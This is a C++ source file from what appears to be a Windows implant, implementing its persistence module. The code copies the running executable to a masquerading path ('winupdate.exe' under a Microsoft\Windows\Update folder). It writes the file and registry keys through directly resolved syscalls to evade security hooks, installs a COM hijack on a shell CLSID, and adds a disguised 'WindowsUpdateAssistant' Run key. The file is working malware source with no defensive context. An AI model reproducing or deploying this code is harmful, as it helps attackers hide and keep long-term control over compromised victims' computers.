#include "Persistence.h"
#include "ComHijacker.h"
#include "../utils/Logger.h"
#include "../utils/Shared.h"
#include "../evasion/Syscalls.h"
#include "../evasion/NtStructs.h"
#include <windows.h>
#include <string>
#include <vector>
#include <shlobj.h>

namespace persistence {

namespace {

std::wstring getExecutablePath() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    return std::wstring(path);
}

std::wstring getPersistPath() {
    wchar_t localAppData[MAX_PATH];
    if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData) != S_OK) {
        return L"";
    }

    std::wstring dir = std::wstring(localAppData) + L"\\Microsoft\\Windows\\Update";
    CreateDirectoryW(dir.c_str(), NULL);

    return dir + L"\\winupdate.exe";
}

bool SyscallWriteFile(const std::wstring& ntPath, const std::vector<BYTE>& data) {
    auto& resolver = evasion::SyscallResolver::GetInstance();
    DWORD ntCreateFileSsn = resolver.GetServiceNumber("NtCreateFile");
    DWORD ntWriteFileSsn = resolver.GetServiceNumber("NtWriteFile");
    DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");

    if (ntCreateFileSsn == 0xFFFFFFFF || ntWriteFileSsn == 0xFFFFFFFF || ntCloseSsn == 0xFFFFFFFF) {
        LOG_ERR("Syscall resolution failed for file operations.");
        return false;
    }

    UNICODE_STRING uPath;
    uPath.Buffer = (PWSTR)ntPath.c_str();
    uPath.Length = (USHORT)(ntPath.length() * sizeof(wchar_t));
    uPath.MaximumLength = uPath.Length + sizeof(wchar_t);

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hFile = NULL;
    IO_STATUS_BLOCK ioStatus;
    RtlZeroMemory(&ioStatus, sizeof(ioStatus));

    NTSTATUS status = InternalDoSyscall(ntCreateFileSsn,
        &hFile,
        (PVOID)(UINT_PTR)(FILE_GENERIC_WRITE | SYNCHRONIZE),
        &objAttr,
        &ioStatus,
        NULL,
        (PVOID)(UINT_PTR)FILE_ATTRIBUTE_NORMAL,
        0,
        (PVOID)(UINT_PTR)FILE_OVERWRITE_IF,
        (PVOID)(UINT_PTR)(FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE),
        NULL,
        (PVOID)(UINT_PTR)0);

    if (!NT_SUCCESS(status)) {
        LOG_ERR("NtCreateFile failed with status: 0x" + utils::Shared::ToHex((unsigned int)status));
        return false;
    }

    status = InternalDoSyscall(ntWriteFileSsn, hFile, NULL, NULL, NULL, &ioStatus, (PVOID)data.data(), (PVOID)(UINT_PTR)(ULONG)data.size(), NULL, NULL, NULL, NULL);

    if (!NT_SUCCESS(status)) {
        LOG_ERR("NtWriteFile failed with status: 0x" + utils::Shared::ToHex((unsigned int)status));
    }

    InternalDoSyscall(ntCloseSsn, hFile, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    return NT_SUCCESS(status);
}

std::vector<BYTE> ReadFileBinary(const std::wstring& path) {
    HANDLE hFile = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return {};

    DWORD size = GetFileSize(hFile, NULL);
    if (size == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        return {};
    }
    std::vector<BYTE> buffer(size);
    DWORD read = 0;
    ReadFile(hFile, buffer.data(), size, &read, NULL);
    CloseHandle(hFile);
    return buffer;
}

} // namespace

bool establishPersistence() {
    std::wstring sourcePath = getExecutablePath();
    std::wstring persistPath = getPersistPath();

    if (persistPath.empty()) {
        LOG_ERR("Persist path is empty");
        return false;
    }

    LOG_DEBUG("Source Path: " + utils::ws2s(sourcePath));
    LOG_DEBUG("Persist Path: " + utils::ws2s(persistPath));

    // Check if we are already running from the persistence path
    if (lstrcmpiW(sourcePath.c_str(), persistPath.c_str()) == 0) {
        LOG_INFO("Running from persistence path. Skipping installation.");
        return false;
    }

    // Read self
    std::vector<BYTE> selfData = ReadFileBinary(sourcePath);
    if (selfData.empty()) {
        LOG_ERR("Failed to read self");
        return false;
    }

    // Write to persist location via syscalls
    std::wstring ntPersistPath = L"\\??\\" + persistPath;
    if (SyscallWriteFile(ntPersistPath, selfData)) {
        LOG_INFO("Implant copied via syscalls to " + utils::ws2s(persistPath));
    } else {
        LOG_WARN("SyscallWriteFile failed, falling back to CopyFileW");
        CopyFileW(sourcePath.c_str(), persistPath.c_str(), FALSE);
    }

    // Stealthy COM Hijack: Folder Background menu
    std::wstring clsid = L"{00021400-0000-0000-C000-000000000046}";

    LOG_INFO("Attempting COM Hijack for " + utils::ws2s(clsid));
    bool comSuccess = ComHijacker::Install(persistPath, clsid);
    if (comSuccess) {
        LOG_INFO("COM Hijack installed successfully.");
    } else {
        LOG_ERR("COM Hijack installation failed.");
    }

    // --- Registry Run Key Persistence (for auto-start on reboot) ---
    LOG_INFO("Attempting Registry Run key persistence...");

    std::wstring sid = utils::GetCurrentUserSid();
    if (sid.empty()) {
        LOG_ERR("Failed to get current user SID for Run key");
        return comSuccess;
    }

    auto& resolver = evasion::SyscallResolver::GetInstance();
    DWORD ntOpenKeySsn = resolver.GetServiceNumber("NtOpenKey");
    DWORD ntSetValueKeySsn = resolver.GetServiceNumber("NtSetValueKey");
    DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");

    if (ntOpenKeySsn != 0xFFFFFFFF && ntSetValueKeySsn != 0xFFFFFFFF && ntCloseSsn != 0xFFFFFFFF) {
        std::wstring hkcuPath = L"\\Registry\\User\\" + sid;
        UNICODE_STRING uHkcu;
        uHkcu.Buffer = (PWSTR)hkcuPath.c_str();
        uHkcu.Length = (USHORT)(hkcuPath.length() * sizeof(wchar_t));
        uHkcu.MaximumLength = uHkcu.Length + sizeof(wchar_t);

        OBJECT_ATTRIBUTES objAttr;
        InitializeObjectAttributes(&objAttr, &uHkcu, OBJ_CASE_INSENSITIVE, NULL, NULL);

        HANDLE hHkcu = NULL;
        NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, &hHkcu, (PVOID)(UINT_PTR)(KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE | KEY_CREATE_SUB_KEY), &objAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

        if (NT_SUCCESS(status)) {
            std::wstring relativePath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
            HANDLE hRunKey = NULL;
            status = utils::Shared::NtCreateKeyRelative(hHkcu, relativePath, &hRunKey);

            InternalDoSyscall(ntCloseSsn, hHkcu, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

            if (NT_SUCCESS(status)) {
                std::wstring valName = L"WindowsUpdateAssistant";
                UNICODE_STRING uValName;
                uValName.Buffer = (PWSTR)valName.c_str();
                uValName.Length = (USHORT)(valName.length() * sizeof(wchar_t));
                uValName.MaximumLength = uValName.Length + sizeof(wchar_t);

                status = InternalDoSyscall(ntSetValueKeySsn, hRunKey, &uValName, NULL, (PVOID)(UINT_PTR)REG_SZ, (PVOID)persistPath.c_str(), (PVOID)(UINT_PTR)((persistPath.length() + 1) * sizeof(wchar_t)), NULL, NULL, NULL, NULL, NULL);

                InternalDoSyscall(ntCloseSsn, hRunKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

                if (NT_SUCCESS(status)) {
                    LOG_INFO("Registry Run key installed successfully.");
                    return true;
                } else {
                    LOG_ERR("NtSetValueKey for Run key failed: 0x" + utils::Shared::ToHex((unsigned int)status));
                }
            } else {
                LOG_ERR("NtCreateKeyRelative for Run path failed: 0x" + utils::Shared::ToHex((unsigned int)status));
            }
        } else {
            LOG_ERR("Failed to open HKCU root for Run key: 0x" + utils::Shared::ToHex((unsigned int)status));
        }
    } else {
        LOG_ERR("Syscall resolution failed for Run key persistence.");
    }

    return comSuccess;
}

} // namespace persistence
